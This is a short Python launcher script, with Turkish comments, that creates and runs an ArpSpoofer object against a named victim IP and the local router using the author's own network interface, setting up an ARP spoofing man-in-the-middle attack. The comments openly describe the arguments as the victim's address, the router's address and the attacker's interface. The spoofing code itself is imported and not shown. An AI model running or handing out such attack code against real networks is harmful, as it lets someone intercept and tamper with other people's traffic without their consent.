from main import *
#Emirhan KARABACAK
#İlk Önce Kurbanın IP Adresi Sonra Aynı ağ üzerindeki Router IP Adresi ve sonrada internete bağlandığımız kendi
#Ethernet adımız
abc = ArpSpoofer('192.168.1.9', '192.168.1.1', 'Wifi')
abc.run()